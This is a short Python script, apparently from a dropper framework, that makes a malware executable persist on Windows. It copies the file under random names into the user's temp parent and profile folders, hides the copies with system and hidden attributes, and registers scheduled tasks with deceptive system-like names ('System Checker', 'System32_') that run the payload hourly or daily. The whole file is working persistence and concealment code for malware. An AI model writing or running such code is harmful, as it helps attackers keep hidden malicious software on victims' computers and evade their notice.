#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to to add your exe file to task scheduler
#Start

def random_name():
    return "Y" + str(randint(10,100))

def F5536( old,new ):
    old_file = open( old,"rb" )
    new_file = open( new,"wb" )
    old_data = old_file.read()
    new_file.write( old_data )
    old_file.close()
    new_file.close()
    blahah = subprocess.Popen( "attrib +s +h " + new,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE ) #hiding the file

#Create a task to to run the malware at specific times
def F5570(exe):
    x = subprocess.Popen("echo %temp%",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.read().decode().strip()
    path1 = "\\".join( x.split( "\\" )[:-1] )
    new_name1 = random_name()
    full_path1 = path1 + "\\" + new_name1 + ".exe"
    F5536( exe,full_path1 )

    x = subprocess.Popen("echo %USERPROFILE%",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.read().decode().strip()
    new_name2 = random_name()
    full_path2 = x + "\\" + new_name2 + ".exe"
    F5536( exe,full_path2 )

    if "System Checker" not in subprocess.Popen("schtasks /query",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.read().decode().strip(): # Will Start every hour at the same time
        blah = subprocess.Popen( 'SCHTASKS /CREATE /SC HOURLY /TN "System Checker" /TR {} >nul'.format( full_path1 ),
        shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE )

    elif "Windows system check" not in subprocess.Popen("schtasks /query",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE).stdout.read().decode().strip():  # Different name , path and runs every day not every hour
        blah = subprocess.Popen( 'SCHTASKS /CREATE /SC daily /TN "System32_" /TR {} >nul'.format( full_path2 ),
        shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE )

F5570(File)
